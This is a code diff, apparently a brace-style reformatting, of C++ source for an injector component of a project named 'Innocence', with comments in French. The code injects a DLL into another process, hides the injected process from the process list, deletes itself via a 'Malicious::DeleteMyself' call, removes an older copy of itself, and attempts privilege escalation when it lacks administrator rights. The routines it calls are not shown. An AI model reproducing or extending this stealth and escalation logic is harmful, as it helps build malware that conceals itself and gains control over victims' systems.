@@ -24,8 +24,7 @@ using namespace std;
 void ExecuteCommand(InhibiterCore& injector, const string& command);
 void Inject(InhibiterCore& injector, const string& inhibitorPath);
 
-int submain(int argc, char ** argv)
-{
+int submain(int argc, char ** argv) {
 	LOG.setIdentity(Common::identity);
 	LOG.addObserver(new Log::LogToCollector);
 	LOG.addObserver(new Log::LogToConsole);
@@ -38,67 +37,55 @@ int submain(int argc, char ** argv)
 	// l'injecteur a plusieurs utilités en plus d'injecter bêtement
 	// la dll dans un processus, il va servir aussi a exécuter
 	// certaines commandes que la DLL ne peut pas faire
-	switch(thisProcess.getArgCount())
-	{
-		case 1:
-			// Pas d'argument au programme, on doit faire une injection
-			Inject(injector, thisProcess.getArg(0));
-			break;
-		case 2:
-			// Il y a un argument, c'est une commande demandée par la DLL
-			ExecuteCommand(injector, thisProcess.getArg(1));
-			break;
-		default:
-			// Il ne peut pas y avoir plus d'un argument
-			LOG << "Bad argument number";
+	switch(thisProcess.getArgCount()) {
+	case 1:
+		// Pas d'argument au programme, on doit faire une injection
+		Inject(injector, thisProcess.getArg(0));
+		break;
+	case 2:
+		// Il y a un argument, c'est une commande demandée par la DLL
+		ExecuteCommand(injector, thisProcess.getArg(1));
+		break;
+	default:
+		// Il ne peut pas y avoir plus d'un argument
+		LOG << "Bad argument number";
 	}
 	return EXIT_SUCCESS;
 }
 
 INNOCENCE_MAIN
 
-void ExecuteCommand(InhibiterCore& injector, const string& command)
-{
+void ExecuteCommand(InhibiterCore& injector, const string& command) {
 	TRACE_FUNCTION
-	if(command == Common::UNINSTALL_CMD)
-	{
+	if(command == Common::UNINSTALL_CMD) {
 		LOG << "Uninstall command";
 		Sleep(1000);
 		injector.uninstall();
 		Malicious::DeleteMyself(Common::INHIBITER_EXE_NAME, Common::SELF_DELETE_CMD);
-	}
-	else if(command == Common::SELF_DELETE_CMD)
-	{
+	} else if(command == Common::SELF_DELETE_CMD) {
 		LOG << "Self delete command";
 		Sleep(500);
 		injector.finishUninstall();
-	}
-	else
-	{
+	} else {
 		LOG << "Injector installation finalizing";
 		Sleep(300);
 #ifndef INNOCENCE_DEBUG
 		LOG << "Deleting old injector : " + command;
-		if(!DeleteFile(command.c_str()))
-		{
+		if(!DeleteFile(command.c_str())) {
 			LOG << "DeleteFile failed : " + Common::toString(GetLastError());
-		}
-		else
+		} else
 #else
-		 LOG << "No program deleting in debug mode";
+		LOG << "No program deleting in debug mode";
 #endif
 		{
 			LOG << "Injection...";
 			injector.inject();
 #ifndef INNOCENCE_DEBUG
 			LOG << "Hiding myself from process list";
-			try
-			{
+			try {
 				ProcessHider hider;
 				hider.hide(injector.getInjectedProcess());
-			}
-			catch(Common::Exception&)
-			{
+			} catch(Common::Exception&) {
 			}
 #else
 			LOG << "No process hiding in debug mode";
@@ -107,27 +94,18 @@ void ExecuteCommand(InhibiterCore& injector, const string& command)
 	}
 }
 
-void Inject(InhibiterCore& injector, const string& inhibitorPath)
-{
+void Inject(InhibiterCore& injector, const string& inhibitorPath) {
 	TRACE_FUNCTION
-	if(!isAdministrator())
-	{
-		if(elevate(inhibitorPath) == EXIT_SUCCESS)
-		{
+	if(!isAdministrator()) {
+		if(elevate(inhibitorPath) == EXIT_SUCCESS) {
 			LOG << "Privilege escalation passed";
-		}
-		else
-		{
+		} else {
 			LOG << "Privilege escalation failed";
 		}
-	}
-	else if(injector.installed())
-	{
+	} else if(injector.installed()) {
 		LOG << "Injecting";
 		injector.inject();
-	}
-	else
-	{
+	} else {
 		LOG << "Installing";
 		injector.install();
 	}
